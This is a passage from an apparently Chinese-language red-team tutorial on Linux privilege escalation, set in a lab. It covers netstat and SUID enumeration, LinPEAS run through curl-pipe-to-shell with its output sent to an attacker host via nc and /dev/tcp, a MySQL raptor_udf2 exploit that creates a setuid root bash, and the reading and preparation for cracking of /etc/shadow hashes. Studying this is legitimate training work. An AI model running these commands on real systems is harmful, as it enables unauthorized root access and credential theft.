+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:ssh                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*                  LISTEN     
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -au
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.10.5:bootpc       10.10.10.254:bootps     ESTABLISHED
+</span></span></code></pre></div><ul>
+<li><code>netstat -l</code>：列出处于 “监听” 模式的端口</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -lt
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:ssh                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*                  LISTEN 
+</span></span></code></pre></div><ul>
+<li><code>netstat -s</code>：按协议列出网络使用统计数据</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -s 
+</span></span><span style="display:flex;"><span>Ip:
+</span></span><span style="display:flex;"><span>    Forwarding: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">29</span> total packets received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> with invalid addresses
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> forwarded
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> incoming packets discarded
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">28</span> incoming packets delivered
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">34</span> requests sent out
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">40</span> dropped because of missing route
+</span></span><span style="display:flex;"><span>    OutTransmits: <span style="color:#ae81ff">34</span>
+</span></span><span style="display:flex;"><span>Icmp:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> ICMP messages received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> input ICMP message failed
+</span></span><span style="display:flex;"><span>    ICMP input histogram:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> ICMP messages sent
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> ICMP messages failed
+</span></span><span style="display:flex;"><span>    ICMP output histogram:
+</span></span><span style="display:flex;"><span>        destination unreachable: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>IcmpMsg:
+</span></span><span style="display:flex;"><span>        OutType3: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Tcp:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> active connection openings
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> passive connection openings
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> failed connection attempts
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> connection resets received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> connections established
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span> segments received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span> segments sent out
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> segments retransmitted
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> bad segments received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> resets sent
+</span></span><span style="display:flex;"><span>Udp:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">17</span> packets received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> packets to unknown port received
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> packet receive errors
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">23</span> packets sent
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> receive buffer errors
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> send buffer errors
+</span></span><span style="display:flex;"><span>    IgnoredMulti: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>UdpLite:
+</span></span><span style="display:flex;"><span>TcpExt:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> packet headers predicted
+</span></span><span style="display:flex;"><span>IpExt:
+</span></span><span style="display:flex;"><span>    InMcastPkts: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    OutMcastPkts: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    InBcastPkts: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    InOctets: <span style="color:#ae81ff">7893</span>
+</span></span><span style="display:flex;"><span>    OutOctets: <span style="color:#ae81ff">4871</span>
+</span></span><span style="display:flex;"><span>    InMcastOctets: <span style="color:#ae81ff">635</span>
+</span></span><span style="display:flex;"><span>    OutMcastOctets: <span style="color:#ae81ff">755</span>
+</span></span><span style="display:flex;"><span>    InBcastOctets: <span style="color:#ae81ff">234</span>
+</span></span><span style="display:flex;"><span>    InNoECTPkts: <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>MPTcpExt:
+</span></span></code></pre></div><ul>
+<li><code>netstat -tp</code>：列出服务名称和 PID 信息的连接</li>
+<li><code>netstat -i</code>：显示接口统计信息</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -i 
+</span></span><span style="display:flex;"><span>Kernel Interface table
+</span></span><span style="display:flex;"><span>Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
+</span></span><span style="display:flex;"><span>eth0             <span style="color:#ae81ff">1500</span>        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> BMRU
+</span></span><span style="display:flex;"><span>lo              <span style="color:#ae81ff">65536</span>        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> LRU
+</span></span></code></pre></div><ul>
+<li><code>netstat -ano</code>：显示所有套接字（a）、不解析名称（n）、显示计时器（o）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -ano
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.10.5:68           10.10.10.254:67         ESTABLISHED off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>raw6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::58                   :::*                    <span style="color:#ae81ff">7</span>           off <span style="color:#f92672">(</span>0.00/0/0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Active UNIX domain sockets <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto RefCnt Flags       Type       State         I-Node   Path
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">16604</span>    
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">13991</span>    /run/user/1000/bus
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">13920</span>    /run/user/1000/bus
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">15235</span>    /run/systemd/journal/stdout
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         DGRAM      CONNECTED     <span style="color:#ae81ff">6736</span>     
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">11367</span>    /run/systemd/journal/stdout
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">2</span>      <span style="color:#f92672">[</span> ACC <span style="color:#f92672">]</span>     STREAM     LISTENING     <span style="color:#ae81ff">8700</span>     /run/systemd/journal/stdout
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">3</span>      <span style="color:#f92672">[</span> <span style="color:#f92672">]</span>         STREAM     CONNECTED     <span style="color:#ae81ff">6085</span>     
+</span></span><span style="display:flex;"><span>unix  <span style="color:#ae81ff">2</span>      <span style="color:#f92672">[</span> ACC <span style="color:#f92672">]</span>     STREAM     LISTENING     <span style="color:#ae81ff">8701</span>     /run/systemd/io.systemd.MuteConsole
+</span></span><span style="display:flex;"><span>......
+</span></span></code></pre></div><h4 id="find">find</h4>
+<p>下面是查找设置 SUID 位文件的命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s type f 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="which">which</h4>
+<ul>
+<li>whereis：用于查找二进制文件、源文件和 man 手册的位置。它只能查找系统默认路径中的文件，不会搜索其他目录或挂载的磁盘。</li>
+<li>which：查找命令所在的位置，并返回找到的第一个命令的完整路径，并返回找到的第一个命令的完整路径。他会在系统 PATH 环境变量中指定的目录中寻找，并返回找到的第一个可执行文件的路径。如果该命令在多个目录中都存在，则只返回最先找到的那个命令的位置。因此，which 命令通常用于查找可执行文件的位置。</li>
+<li>locate：使用本地数据库来快速查找指定位置，不会实时更新文件系统，使用可能会出现找不到文件的情况，为了保证正确的，可以使用 <code>updatedb</code> 命令更新数据库。</li>
+<li>type：用于查找命令是否内置命令、外部命令还是别名。如果是内置命令则返回 ”builtin“，如果是外部命令则返回可执行文件的位置，如果是别名则返回别名定义的命令。</li>
+<li>apropos：用于在系统的 man 手册中搜索与指定关键词相关的条目。它可以帮助用户快速找到特定主题或命令相关手册页。</li>
+<li>find：用于在指定路径下递归搜索符合条件的文件。它可以根据文件名、文件类型、文件大小、文件权限等条件来搜索文件。</li>
+<li>grep：用于在指定文件中查找符合条件的字符串。支持正则表达式，可快速查找文本文件中的关键词。</li>
+<li>where：与 which 类似，但他可以同时查找多个命令，而 which 只能查找单个命令。where 命令会在系统 PATH 环境变量中指定的所有目录中寻找，并放回找到的所有命令的位置。如果该命令在多个目录中都存在则会返回所有找到命令的位置。</li>
+</ul>
+<h4 id="etcfstab">/etc/fstab</h4>
+<p>检测未挂载的文件系统。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat etc/fstab
+</span></span></code></pre></div><h3 id="自动化枚举">自动化枚举</h3>
+<h4 id="常用工具">常用工具</h4>
+<ul>
+<li>LinPEAS：全称为 Linux Privilege Awesome Script，是一个用来搜索类 unix 主机上可能的提权路径的自动化脚本。</li>
+<li>LinEnum：一个流行的 Linux 本地枚举脚本，用于收集有关系统的各种信息，识别不安全配置，提取可用于提升权限的漏洞信息。</li>
+<li>linux-smart-enumeration（lse）：一个具有模块化功能的 Linux 本地枚举脚本。</li>
+<li>linux-exploit-suggester：用于识别 Linux 系统中可能存在的可利用漏洞。</li>
+<li>Linuxprivchecker：检查 Linux 系统潜在安全问题的 python 脚本。</li>
+<li>unix-privese-check：识别类 UNIX 系统中可能的权限提升路径。</li>
+</ul>
+<h3 id="linpeas-最佳实践">LinPEAS 最佳实践</h3>
+<p>使用 <code>curl</code> 直接从 Github 中执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+</span></span></code></pre></div><p>使用 wget 下载后给权限单独执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># 本地网络下载 </span>
+</span></span><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span> <span style="color:#75715e">#kali </span>
+</span></span><span style="display:flex;"><span>curl 10.10.10.5/linpeas.sh | sh <span style="color:#75715e">#靶机 </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 从内存中执行，结果发回kali </span>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">81</span> | tee linpeas.out <span style="color:#75715e">#kali </span>
+</span></span><span style="display:flex;"><span>curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 <span style="color:#ae81ff">81</span> <span style="color:#75715e">#靶机 </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 没有curl的情况 </span>
+</span></span><span style="display:flex;"><span>sudo nc -q <span style="color:#ae81ff">5</span> -lvnp <span style="color:#ae81ff">80</span> &lt; linpeas.sh <span style="color:#75715e">#kali </span>
+</span></span><span style="display:flex;"><span>cat &lt; /dev/tcp/10.10.10.10/80 | sh <span style="color:#75715e">#靶机</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出到文件 </span>
+</span></span><span style="display:flex;"><span>./linpeas.sh -a &gt; /dev/shm/linpeas.txt <span style="color:#75715e">#主机 </span>
+</span></span><span style="display:flex;"><span>less -r /dev/shm/linpeas.txt <span style="color:#75715e">#读取分色文件</span>
+</span></span></code></pre></div><p>使用 LinePEAS 二进制文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas_linux_amd64 chmod +x linpeas_linux_amd64 ./linpeas_linux_amd64
+</span></span></code></pre></div><h2 id="提权实战演示">提权实战演示</h2>
+<h3 id="mysql-udf">mysql-udf</h3>
+<p>使用 mysql 用户自定义函数提权，udf 是 User-Defined Function（用户自定义函数），可以在 SQL 查询中使用，类似于内置函数。通过使用 UDF 用户可以对数据库执行自定义操作，从而满足特定业务需求。用户自定义函数通常用于处理复杂的数据操作，简化查询，或者实现数据库本身不支持的特定功能。这是 mysql 数据库自带的功能，无需特定设置。</p>
+<h4 id="提权条件">提权条件</h4>
+<ol>
+<li>掌握 mysql 数据库的账户：该账户对 mysql 用于 <code>create</code>、<code>insert</code>、<code>delete</code> 等权限，以创建和使用函数（最好是 root 账户）。</li>
+<li>secure_filr_priv 为空：使用命令 <code>show variables like '%secure_file_priv%'</code> 查看，<code>secure_file_priv</code> 是 mysql 系统变量，用于限制 <code>LOAD DATA</code>、<code>SELECT ... INTO OUTFILE</code>、<code>LOAD_FILE()</code> 等文件操作范围，它可以限制这些操作仅在特定目录下进行以增强系统的安全性。当 <code>secure_file_priv</code> 设置为一个非空目录路径时，这些操作仅允许在指定目录下进行。</li>
+</ol>
+<h4 id="准备利用条件">准备利用条件</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc -g -c raptor_udf2.c -fPIC
+</span></span></code></pre></div><ul>
+<li>-g：生成调试信息</li>
+<li>-c：指示编译器仅编译源码，但不进行链接</li>
+<li>-fPIC：告诉编译器生成位置无关代码（Position-Independent Code，PIC），这种代码可以在内存中的任意位置执行</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</span></span></code></pre></div><ul>
+<li>-shared：生成一个共享库文件而非可执行文件</li>
+<li>-Wl：将后面的选项传递给链接器</li>
+<li>-soname,raptor_udf2.so：设置生成的共享库的 &ldquo;soname&rdquo;</li>
+<li>-lc：链接器链接标准 C 库</li>
+</ul>
+<h4 id="利用过程">利用过程</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> mysql;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">create</span> <span style="color:#66d9ef">table</span> <span style="color:#a6e22e">foo</span>(line <span style="color:#66d9ef">blob</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">insert</span> <span style="color:#66d9ef">into</span> foo <span style="color:#66d9ef">values</span>(<span style="color:#a6e22e">load_file</span>(<span style="color:#e6db74">&#39;home/user/tools/mysql-udf/raptor_udf2.so&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> foo <span style="color:#66d9ef">into</span> dumpfile <span style="color:#e6db74">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">create</span> function do_system returns <span style="color:#66d9ef">integer</span> <span style="color:#66d9ef">soname</span> <span style="color:#e6db74">&#39;raptor_udf2.so&#39;</span>;
+</span></span></code></pre></div><ul>
+<li>create table foo(line blob)：创建一个名为 &ldquo;foo&rdquo; 的表（table），包含名为 &ldquo;line&rdquo; 的列（column），数据类型为 BLOB。BLOB 表示 &ldquo;Binary Large Object&rdquo;，可以储存大量二进制数据。</li>
+<li>foo 在计算机编程和网络中是一个常用占位符的名称。</li>
+<li>create function do_system returns integer soname &lsquo;raptor_udf2.so&rsquo;：寻找 plugin 目录中的 .so 文件。</li>
+<li>如果 dumpfile 失败，对于 AppArmor 编辑 <code>/etc/apparmor.d/usr.sbin.mysqld </code>文件，找到以下行：<code>/usr/sbin/mysqld {</code>，在此行下方添 加以下内容： <code>/usr/lib/mysql/plugin/** rw</code>。</li>
+<li>删除 mysql 函数命令：<code>DROP FUNCTION IF EXISTS dosystem;</code>。</li>
+<li>查询已有 udf：<code>SELECT * FROM mysql.func;</code>。</li>
+</ul>
+<p>执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#a6e22e">do_system</span>(<span style="color:#e6db74">&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;</span>);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/rootbash -p
+</span></span></code></pre></div><h3 id="可读-shadow-文件提权">可读 shadow 文件提权</h3>
+<h4 id="利用过程-1">利用过程</h4>
+<p>查看 <code>/etc/shadow</code> 文件发现可读。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah /etc/shadow
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1241132</span> -rw-r--rw- <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">842</span> Apr <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2023</span> /etc/shadow
+</span></span></code></pre></div><p>读取 <code>/etc/shadow</code> 文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/shadow
+</span></span><span style="display:flex;"><span>root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>daemon:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>bin:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>sys:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>sync:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>games:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>man:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>lp:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>mail:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>news:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>uucp:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>proxy:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>www-data:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>backup:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>list:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>irc:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>gnats:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>nobody:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>libuuid:!:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>Debian-exim:!:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>sshd:*:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>statd:*:17299:0:99999:7:::
+</span></span><span style="display:flex;"><span>messagebus:*:19472:0:99999:7:::
+</span></span></code></pre></div><p>将加密的密码复制到 kali，使用 john 破解密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 靶机</span>
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/shadow | grep <span style="color:#e6db74">&#39;:\$&#39;</span>
+</span></span><span style="display:flex;"><span>root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#kali</span>
+</span></span><span style="display:flex;"><span>──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat &gt;&gt; passwd.txt <span style="color:#e6db74">&lt;&lt; EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">heredoc&gt; root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">heredoc&gt; EOF</span>
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat passwd.txt          
+</span></span><span style="display:flex;"><span>root:/euwmK.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+</span></span><span style="display:flex;"><span>user:/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim hash
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hash 
+</span></span><span style="display:flex;"><span>root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
